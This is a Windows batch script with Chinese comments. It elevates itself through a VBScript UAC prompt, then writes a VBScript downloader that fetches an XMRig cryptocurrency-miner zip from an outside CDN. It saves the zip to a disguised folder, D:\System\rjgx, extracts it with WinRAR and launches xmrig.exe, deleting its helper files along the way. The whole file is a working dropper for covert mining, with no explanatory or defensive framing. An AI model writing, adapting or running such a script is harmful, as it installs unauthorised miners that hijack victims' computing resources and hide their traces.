 @echo off
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
exit /B
:gotAdmin
if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
::设置要下载的文件链接，仅支持http协议。必写项。
set Url=https://cdn.g-7.net/xmrig-6.12.1cpu50.zip
::设置文件保存目录，若下载至当前目录，请留空
set Save=D:\System\rjgx
if exist %Save% (echo 位置：%Save%) else (mkdir %Save% & echo 已创建：%Save%)
 
for %%a in ("%Url%") do set "FileName=%%~nxa"
if not defined Save set "Save=%cd%"
(echo Download Wscript.Arguments^(0^),Wscript.Arguments^(1^)
echo Sub Download^(url,target^)
echo   Const adTypeBinary = 1
echo   Const adSaveCreateOverWrite = 2
echo   Dim http,ado
echo   Set http = CreateObject^("Msxml2.ServerXMLHTTP"^)
echo   http.open "GET",url,False
echo   http.send
echo   Set ado = createobject^("Adodb.Stream"^)
echo   ado.Type = adTypeBinary
echo   ado.Open
echo   ado.Write http.responseBody
echo   ado.SaveToFile target
echo   ado.Close
echo End Sub)>DownloadFile.vbs
DownloadFile.vbs "%Url%" "%Save%\%FileName%"
::下载完删除生成的vbs文件
del DownloadFile.vbs
"C:\Program Files\WinRAR\WinRAR.exe" x -y D:\System\rjgx\xmrig-6.12.1cpu50.zip D:\System\rjgx\
start D:\System\rjgx\xmrig.exe